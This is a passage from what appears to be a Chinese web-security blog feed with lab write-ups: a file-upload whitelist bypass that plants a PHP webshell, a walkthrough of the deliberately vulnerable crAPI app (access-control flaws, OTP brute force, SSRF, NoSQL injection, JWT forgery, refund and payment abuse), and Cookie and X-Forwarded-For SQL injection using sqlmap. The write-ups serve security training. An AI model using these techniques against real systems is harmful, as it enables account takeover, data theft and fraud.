class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来进行代码审计，拉一遍流程，首先使用<code>empty</code>函数看看<code>upload_file</code>是不是为空，不为空检查MIME头是不是符合，我们这里将MIME头修改一下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718222003737.png" alt="image-20240718222003737"></p><p>之后会对文件名进行检查，如果<code>save_name</code>为空，则把<code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>赋值给<code>$file</code>，反之则把<code>$_POST[&#39;save_name&#39;]</code>赋值给<code>$file</code></p><p>接下来使用<code>is_array</code>判断<code>$file</code>是不是数组，如果不为数组，则把其转为数组</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">explode</span>(separator,<span class="keyword">string</span>,limit)  <span class="comment">//函数把字符串打散为数组。</span></span><br><span class="line">separator 必需。规定在哪里分割字符串。</span><br><span class="line"><span class="keyword">string</span> 必需。要分割的字符串。</span><br><span class="line">limit 可选。规定所返回的数组元素的数目。</span><br></pre></td></tr></table></figure><p>这里以<code>.</code>为分割进行分数组，同时把所有的字符转成小写，以这里的为例，就会有<code>array[0]=upload-20，array[1]=jpg</code>，然后再使用<code>end()</code>函数，end函数将指针指向最后一个元素并输出，即把jpg赋值给<code>$ext</code>，即<code>$ext=jpg</code>，然后去判断后缀名是不是合法的，是不是在白名单内的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">count</span>()   <span class="comment">//计算数组中的单元数目，或对象中的属性个数</span></span><br><span class="line"><span class="title function_ invoke__">end</span>()  <span class="comment">//函数将内部指针指向数组中的最后一个元素，并输出。    </span></span><br><span class="line"><span class="title function_ invoke__">reset</span>()     <span class="comment">//输出数组中的当前元素和下一个元素的值，然后把数组的内部指针重置到数组中的第一个元素：</span></span><br></pre></td></tr></table></figure><p>最后将<code>$file</code>的第一个元素和<code>$ext</code>拼接起完整的路径</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>我们肯定是在数组上做文章，我们肯定不能让它使用<code>explode</code>函数对我们进行分割，如果让其进行分割的话，我们特定不能传进去<code>.php</code>后缀，所以我们就得自己把<code>save_name</code>整成数组形式，也就是分多块进行传输，我们不妨这样设计</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">save_name[<span class="number">0</span>]=attack.php</span><br><span class="line">save_name[<span class="number">2</span>]=jpg</span><br></pre></td></tr></table></figure><p>这样我们的<code>$ext=save_name[1]=jpg</code>，成功绕过后缀检测的代码段</p><p>由于<code>reset()</code>函数输出数组第一个，所以</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line"><span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) = attack.php</span><br><span class="line">由于<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) = <span class="number">2</span> <span class="comment">//由于1为空，所以返回2，count只计算属性数</span></span><br><span class="line">所以<span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>)-<span class="number">1</span>]=<span class="variable">$file</span>[<span class="number">1</span>]=<span class="literal">null</span></span><br><span class="line">所以<span class="variable">$file_name</span> = attack.php</span><br><span class="line">因此成功绕过</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718225558437.png" alt="image-20240718225558437"></p><p>我们用蚁剑连接即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718225647910.png" alt="image-20240718225647910"></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB安全 </category>
          
          <category> 实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crAPI靶场搭建及通关教程</title>
      <link href="/post/369f2ba7.html"/>
      <url>/post/369f2ba7.html</url>
      
        <content type="html"><![CDATA[<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>我是搭建在服务器上的，当然，如果你有虚拟机也可以搭建在虚拟机上，但是最好用一个新的Ubuntu环境，不然就会出现各种各样的问题，导致搞了好几个小时环境问题还没搞明白，下面演示在服务器上搭建相关的靶场环境（服务器记得放行8888端口和8025端口）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">首先确保自己的服务器有docker环境</span><br><span class="line">依次输入如下命令：</span><br><span class="line">curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/main/deploy/docker/docker-compose.yml</span><br><span class="line">docker-compose pull</span><br><span class="line">vim docker-compose.yml</span><br><span class="line">输入<span class="string">&quot;:&quot;</span>进入末行模式，并输入命令进行替换</span><br><span class="line">:1,250 s/127.0.0.1/xx.xx.xx.xx(服务器公网IP)/g</span><br><span class="line">docker-compose -f docker-compose.yml --compatibility up -d</span><br></pre></td></tr></table></figure><p>当出现下面的页面的时候，就代表靶场启动成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717162223135.png" alt="image-20240717162223135"></p><p>我们在自己的浏览器上输入<code>xx.xx.xx.xx（服务器公网IP）:8888/login</code>访问，得到下面的界面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717162655737.png" alt="image-20240717162655737"></p><p>如果启动的时候出现错误，检查端口有没有放行，端口有没有被占用，或者重启docker服务</p><h2 id="注册账号"><a href="#注册账号" class="headerlink" title="注册账号"></a>注册账号</h2><p>注册账号，非常简单，我们根据提示来就行，然后我们登录我们的邮件服务器，即8025端口，进行邮件接收</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717164623163.png" alt="image-20240717164623163"></p><p>我们点击查看邮件，将返回给我们的数据填到对应的地方</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717164718098.png" alt="image-20240717164718098"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/99feeb2d009277400c0a9b6463c962b5.png" alt="99feeb2d009277400c0a9b6463c962b5"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717164841053.png" alt="image-20240717164841053"></p><p>然后我们就可以得到我们的车，接着就可以开始闯关了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717164955030.png" alt="image-20240717164955030"></p><h2 id="挑战1：访问其它用户车辆的详细信息"><a href="#挑战1：访问其它用户车辆的详细信息" class="headerlink" title="挑战1：访问其它用户车辆的详细信息"></a>挑战1：访问其它用户车辆的详细信息</h2><p>首先我们进入Community界面，这里面有其他用户发表的POST，任意点击一个条目，我们试着去抓包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717165521254.png" alt="image-20240717165521254"></p><p>相关的敏感信息已经出来了，我们记下字段<code>&quot;vehicleid&quot;:&quot;4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5&quot;</code>，方便我们后续进行水平越权</p><p>我们回到dashboard界面，重新刷新位置信息并抓包，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/c27d4a629c4b7bb8b5caed4840fe05d0.png" alt="c27d4a629c4b7bb8b5caed4840fe05d0"></p><p>我们可以将对应的字段换成我们想要查找的车辆，进而可以方便我们查找其他车辆的位置信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717170155984.png" alt="image-20240717170155984"></p><p>水平越权成功</p><h2 id="挑战2：访问其它用户的机械报告"><a href="#挑战2：访问其它用户的机械报告" class="headerlink" title="挑战2：访问其它用户的机械报告"></a>挑战2：访问其它用户的机械报告</h2><p>首先我们要找到我们自己的机械报告在哪</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717182728869.png" alt="image-20240717182728869"></p><p>我们点击这里，显示页面如下，我们随便填入一些并进行抓包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717182825119.png" alt="image-20240717182825119"></p><p>抓包返回结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/7445ecc450108a34bcafd52f121d345c.png" alt="7445ecc450108a34bcafd52f121d345c"></p><p>我们把这个url复制下来，替换我们request包的请求地址，并把请求方式改成GET，然后再发包，我们通过修改<code>report_id</code>的值可以越权访问别人的报告</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/445ae9165ca60f676a72d63e154fad40.png" alt="445ae9165ca60f676a72d63e154fad40"></p><h2 id="挑战3：重置其它用户的密码"><a href="#挑战3：重置其它用户的密码" class="headerlink" title="挑战3：重置其它用户的密码"></a>挑战3：重置其它用户的密码</h2><p>我们首先退出我们的登录界面。如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/4ec014e38c92bf0ef3f37ba38c2d9cae.png" alt="4ec014e38c92bf0ef3f37ba38c2d9cae"></p><p>我们点击忘记密码，发现发给我们的邮件验证码只有四位，所以我们可以考虑爆破这四位验证码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717184019471.png" alt="image-20240717184019471"></p><p>我们暂时使用我们这个账号进行爆破，如果我们这个账号可以爆破出来，那么其他的任意账户同样可以爆破出来，我们先随便输入一个验证码，并把密码输入进去</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717184240500.png" alt="image-20240717184240500"></p><p>然后开始抓包，将抓到的包送入Intruder模块，在验证码处加上$$$$符号，然后设置payload</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717184431569.png" alt="image-20240717184431569"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717184720620.png" alt="image-20240717184720620"></p><p>点击<code>start attack</code>，开始爆破</p><p>我们发现，当重放次数过多之后，服务器会拒绝访问，这个时候我们将v3改成v2就可以解决问题</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/98dced1cb63526b5fd4dc51db2cc660a.png" alt="98dced1cb63526b5fd4dc51db2cc660a"></p><p>经过长时间的爆破，我们可以拿到验证码<code>2033</code></p><h2 id="挑战4：找到泄露其它用户敏感信息的API接口"><a href="#挑战4：找到泄露其它用户敏感信息的API接口" class="headerlink" title="挑战4：找到泄露其它用户敏感信息的API接口"></a>挑战4：找到泄露其它用户敏感信息的API接口</h2><p>点击Community进行抓包，重新发包，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717191106378.png" alt="image-20240717191106378"></p><p>获得所有发表评论的用户的信息，格式为json，造成敏感信息泄露</p><h2 id="挑战5：找到泄露视频内部属性的API接口"><a href="#挑战5：找到泄露视频内部属性的API接口" class="headerlink" title="挑战5：找到泄露视频内部属性的API接口"></a>挑战5：找到泄露视频内部属性的API接口</h2><p>我们找到视频页面，随机上传一个视频，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717191659464.png" alt="image-20240717191659464"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717191649635.png" alt="image-20240717191649635"></p><p>我们修改视频名字，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717191815903.png" alt="image-20240717191815903"></p><p>随机输入名字并进行抓包，放包，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/07e1a63d9c5a96ac4bc95a6dc256d26e.png" alt="07e1a63d9c5a96ac4bc95a6dc256d26e"></p><p>所以<code>/identity/api/v2/user/videos/6</code>这个api接口就是我们想要的，我们可以试着修改后面的数值，看看是否会给我们泄露其他视频的属性，发现是不会显示其他用户视频信息的，可能是在Authorization做了限制</p><h2 id="挑战6：使用-“contact-mechanic”-功能完成第7层DoS"><a href="#挑战6：使用-“contact-mechanic”-功能完成第7层DoS" class="headerlink" title="挑战6：使用 “contact mechanic” 功能完成第7层DoS"></a>挑战6：使用 “contact mechanic” 功能完成第7层DoS</h2><p>点击<code>Contact Mechanic</code>，随便填写一些内容，像挑战2一样</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717193847234.png" alt="image-20240717193847234"></p><p>点击提交并进行抓包，送入repeater模块，我们将<code>repeat_request_if_failed</code>改为true，并将<code>number_of_repeats</code>改为较大的数字，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717194128593.png" alt="image-20240717194128593"></p><p>点击发送，得到如下界面，成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717194202693.png" alt="image-20240717194202693"></p><h2 id="挑战7：删除另一个用户的视频"><a href="#挑战7：删除另一个用户的视频" class="headerlink" title="挑战7：删除另一个用户的视频"></a>挑战7：删除另一个用户的视频</h2><p>和挑战5的步骤一样，找到修改video名称的界面并进行抓包，并送到重放界面，先用OPTIONS进行探测支持哪些协议</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/ae7dcdc6ff9a197018c2d459173a1d13.png" alt="ae7dcdc6ff9a197018c2d459173a1d13"></p><p>支持DELETE，我们使用DELETE协议删除视频，将id改成其他用户的ID</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717193213414.png" alt="image-20240717193213414"></p><p>发现没有权限，我们尝试将user改成admin，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/021a026c206f5c954738eef14e455f87.png" alt="021a026c206f5c954738eef14e455f87"></p><p>成功删除任意用户视频</p><h2 id="挑战8：免费获得一件物品"><a href="#挑战8：免费获得一件物品" class="headerlink" title="挑战8：免费获得一件物品"></a>挑战8：免费获得一件物品</h2><p>我们首先进入shop页面，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717194508118.png" alt="image-20240717194508118"></p><p>我们点击购买，然后抓包，我们发送到repeater上，然后点击发送</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717194947054.png" alt="image-20240717194947054"></p><p>我们发现我们的余额确实减少了10块钱，我们将协议方式改为GET，并在orders后面加上id号，然后再发送</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717195625853.png" alt="image-20240717195625853"></p><p>我们可以看到对应订单的详情，我们复制相应的status，并将协议改为PUT，然后将status改为returned状态，然后发送</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717200124963.png" alt="image-20240717200124963"></p><p>我们发现我们余额增加，实现免费购买一件物品</p><h2 id="挑战9：将您的结余增加1000元或以上"><a href="#挑战9：将您的结余增加1000元或以上" class="headerlink" title="挑战9：将您的结余增加1000元或以上"></a>挑战9：将您的结余增加1000元或以上</h2><p>同上，修改订单状态为<code>delivered</code>，表示我们的订单已经发送，并把数量改成100</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717201113881.png" alt="image-20240717201113881"></p><p>然后我们再把状态改为退款状态<code>returned</code>，并重新发送</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/cb2889132f85a0921ac13b62ea751d74.png" alt="cb2889132f85a0921ac13b62ea751d74"></p><p>我们查看自己的余额，发现余额刷新了，证明成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717201336155.png" alt="image-20240717201336155"></p><h2 id="挑战10：更新内部视频属性"><a href="#挑战10：更新内部视频属性" class="headerlink" title="挑战10：更新内部视频属性"></a>挑战10：更新内部视频属性</h2><p>同挑战5，我们找到抓取修改视频名称的包，我们先点击发送包，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717201818983.png" alt="image-20240717201818983"></p><p>我们发现<code>conversion_params</code>属性，我们尝试修改这个值，然后重发</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717202126060.png" alt="image-20240717202126060"></p><p>发现对应属性成功被修改</p><h2 id="挑战11：让crAPI发送一个HTTP调用到“www-baidu-com”并返回"><a href="#挑战11：让crAPI发送一个HTTP调用到“www-baidu-com”并返回" class="headerlink" title="挑战11：让crAPI发送一个HTTP调用到“www.baidu.com”并返回"></a>挑战11：让crAPI发送一个HTTP调用到“www.baidu.com”并返回</h2><p>同挑战6的数据包抓取方式，这里就不再赘述，这里我们使用dnslog.cn进行记录我们的dns解析记录，我们首先随机获取一个子域名，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717202724472.png" alt="image-20240717202724472"></p><p>我们将数据包下的<code>mechanic_api</code>改成我们的子域名，然后发数据包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717203031254.png" alt="image-20240717203031254"></p><p>我们去dnslog.cn上刷新，出现下面界面，代表成功带出DNSlog</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717203105051.png" alt="image-20240717203105051"></p><h2 id="挑战12：想办法在不知道优惠券代码的情况下获得免费优惠券"><a href="#挑战12：想办法在不知道优惠券代码的情况下获得免费优惠券" class="headerlink" title="挑战12：想办法在不知道优惠券代码的情况下获得免费优惠券"></a>挑战12：想办法在不知道优惠券代码的情况下获得免费优惠券</h2><p>这里我们采用nosql进行注入，首先我们找到优惠券界面，随意输入优惠券代码并进行抓包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717203827678.png" alt="image-20240717203827678"></p><p>我们输入{“$ne”:”xxxxxxxxxxx”}进行nosql注入，得到如下结果</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717204347590.png" alt="image-20240717204347590"></p><p>说明已经成功获取优惠券</p><h2 id="挑战13-找到一种通过修改数据库来兑换已经领取的优惠券的方法"><a href="#挑战13-找到一种通过修改数据库来兑换已经领取的优惠券的方法" class="headerlink" title="挑战13.找到一种通过修改数据库来兑换已经领取的优惠券的方法"></a>挑战13.找到一种通过修改数据库来兑换已经领取的优惠券的方法</h2><p>白盒测试找源码吧，这个接口只能在源码中找到，测是测不出来的，相关接口是<code>/workshop/api/shop/apply_coupon</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717210245042.png" alt="image-20240717210245042"></p><p>我们首先在coupon界面抓包，修改url地址为对应接口地址，并把<code>coupon_code</code>修改为万能密码，并增加数量参数amount</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717211602407.png" alt="image-20240717211602407"></p><p>这里我失败了，正常的情况下应该是下面的情况</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717211710644.png" alt="image-20240717211710644"></p><p>我也不知道是什么情况😇😇😇</p><h2 id="挑战14：查找不为用户执行身份验证检查的接口"><a href="#挑战14：查找不为用户执行身份验证检查的接口" class="headerlink" title="挑战14：查找不为用户执行身份验证检查的接口"></a>挑战14：查找不为用户执行身份验证检查的接口</h2><p>订单接口无身份验证可以随意访问数据<code>/workshop/api/shop/orders/1</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717211952440.png" alt="image-20240717211952440"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717212009094.png" alt="image-20240717212009094"></p><h2 id="挑战15：找到伪造有效-JWT令牌的方法"><a href="#挑战15：找到伪造有效-JWT令牌的方法" class="headerlink" title="挑战15：找到伪造有效 JWT令牌的方法"></a>挑战15：找到伪造有效 JWT令牌的方法</h2><p>首先获取jwt的公钥，我们访问<code>.well-known/jwks.json</code>接口文件可以获得相关的公钥</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717215427973.png" alt="image-20240717215427973"></p><p>将keys复制到jwt editor中进行编辑，我们new 一个rsa key，然后点击<code>Copy Public Key as Pem</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717220300683.png" alt="image-20240717220300683"></p><p>去Decoder选项卡对这个进行encode</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717220536726.png" alt="image-20240717220536726"></p><p>再次回到Burp 主选项卡栏中 的 JWT Editor Keys选项卡，点击New SymmetricKey后Generate,将 k 属性的生成值替换为PEM Base64编码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717220721845.png" alt="image-20240717220721845"></p><p>然后在burp的请求中可以发现 json webtoken选项卡,在选择卡左下角处也可以看到对 json web token 的攻击选项</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717220939728.png" alt="image-20240717220939728"></p><p>我们再次抓取dashboard的包，看看我们能否通过修改jwt进行越权访问别人的账户</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717221323698.png" alt="image-20240717221323698"></p><p>我们先前已经注册一个abc@qq.com了，现在我们来试试能不能越权</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717221819570.png" alt="image-20240717221819570"></p><p>成功越权，jwt使用成功</p><h2 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h2><h3 id="增加一个商品"><a href="#增加一个商品" class="headerlink" title="增加一个商品"></a>增加一个商品</h3><p>首先获取商品接口，我们还是通过抓包来实现，我们将请求方法改成POST，在请求体中添加商品的具体信息</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;周俊霖&quot;</span><span class="punctuation">,</span><span class="attr">&quot;price&quot;</span><span class="punctuation">:</span><span class="string">&quot;100000.00&quot;</span><span class="punctuation">,</span><span class="attr">&quot;image_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;images/seat.svg&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717222425946.png" alt="image-20240717222425946"></p><p>点击发送，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717222458221.png" alt="image-20240717222458221"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717222522793.png" alt="image-20240717222522793"></p><p>成功新增一个商品</p><h3 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h3><p>首先我们的初始余额是1060美元</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717222655022.png" alt="image-20240717222655022"></p><p>我们现在购买一个商品，然后抓包，我们将数量改成负数，发现并没有对数字进行限制，我们可以发现余额惊奇的变多了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717222848889.png" alt="image-20240717222848889"></p><p>出现这个漏洞的原因是后端在进行计算时没有对传进来的数据进行二次校验，导致出现支付漏洞</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>靶场加深了我对API安全的认识，有些漏洞在现实生产环境中仍然很普遍，同时，通过打靶场，加深了我对一个网站如何进行测试的理解，虽然有些漏洞比较偏，也比较难想，但是经过多多实践，还是可以熟能生巧的</p><p>这个靶场带给我的最大的惊喜还是jwt，它告诉了我关于jwt还可以使用bp进行破解，当然这个手法还需要后续的学习与理解，以前我都是直接通过脚本进行破解，没有直接用bp来的舒服，又多了一种新的姿势🤔🤔🤔</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB安全 </category>
          
          <category> 实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-SQL注入（五）之非常规注入点</title>
      <link href="/post/53b0efb9.html"/>
      <url>/post/53b0efb9.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>原理很简单，只是注入位置不同，XFF注入的典型特征就是后端代码有检测IP的代码段，类似于下面这种</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132810710-77342179.png" alt="1645176338339-1fbc9c7f-e523-40be-81ac-994d706874cb.png"></p><p>一般用来判断一个IP是不是进行了多次重复操作而设置的，一般我们可以使用<code>x-forwarded-for</code>进行IP欺骗，并在此处进行sql注入；而Cookie就是在Cookie处进行注入，换汤不换药，其实和GET型注入区别不大，下面以两道例题来解释这两种注入方法</p><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p>以sqllab第20关为例子，这里需要用到bp进行抓包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240714175004900.png" alt="image-20240714175004900"></p><p>我们先随便输入账号密码，然后抓包看看什么情况</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240715131853605.png" alt="image-20240715131853605"></p><p>返回这个，提示我们是Cookie注入，我们用bp进行Cookie注入，首先将Cookie设置为admin，发送</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240715132858324.png" alt="image-20240715132858324"></p><p>加上单引号<code>admin&#39;</code>，发现报错</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240715132946220.png" alt="image-20240715132946220"></p><p>加上注释符，页面重新正常</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240715133049045.png" alt="image-20240715133049045"></p><p>所以我们知道为单引号闭合的字符型注入，接下来就是常规的联合注入，猜字段数，如下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240715133457121.png" alt="image-20240715133457121"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240715133516943.png" alt="image-20240715133516943"></p><p>字段为3，看显位</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240715133645181.png" alt="image-20240715133645181"></p><p>显位为2，3，继续猜库名，这里直接放图，后续就不再写步骤</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240715133806653.png" alt="image-20240715133806653"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240715133941240.png" alt="image-20240715133941240"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240715134057261.png" alt="image-20240715134057261"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240715134148608.png" alt="image-20240715134148608"></p><p>至此，Cookie注入到此结束，和普通的注入没有什么太大的区别，主要区别就在于注入点的位置不一样</p><h2 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h2><p>我们这里以墨者靶场为例子进行演示，相关题目链接如下所示：<a href="https://www.mozhe.cn/bug/detail/10">X-Forwarded-For注入漏洞实战<em>SQL注入</em>在线靶场<em>墨者学院</em>专注于网络安全人才培养 (mozhe.cn)</a></p><p>首先进去看到页面如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240716165031321.png" alt="image-20240716165031321"></p><p>首先仍然还是随便输入账号密码看看有没有什么提示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240716165139629.png" alt="image-20240716165139629"></p><p>显示了一堆乱码并返回了我的IP，这个时候就可以测一测IP这个地方是不是有什么问题，我们开启抓包工具进行抓包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240716165334872.png" alt="image-20240716165334872"></p><p>这里确实存在注入点，我们接下来使用sqlmap帮我们进行爆数据，对于这种如何使用sqlmap呢？我们只需要在我们认为的注入点打上一个*来告诉sqlmap这里是我们的注入点，然后我们将数据包保存为txt文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240716171800523.png" alt="image-20240716171800523"></p><p>然后我们使用sqlmap梭哈</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240716172011864.png" alt="image-20240716172011864"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240716213733140.png" alt="image-20240716213733140"></p><p>查当前数据库，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240716213821886.png" alt="image-20240716213821886"></p><p>查看当前数据库下的表名，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240716213938604.png" alt="image-20240716213938604"></p><p>直接列名，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240716214024340.png" alt="image-20240716214024340"></p><p>脱裤，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240716214130793.png" alt="image-20240716214130793"></p><p>登录平台，可以拿到flag，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240716214303764.png" alt="image-20240716214303764"></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> SQL注入 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cookie </tag>
            
            <tag> XFF </tag>
            
            <tag> POST </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-SQL注入（四）</title>
      <link href="/post/15e742f3.html"/>
      <url>/post/15e742f3.html</url>
      
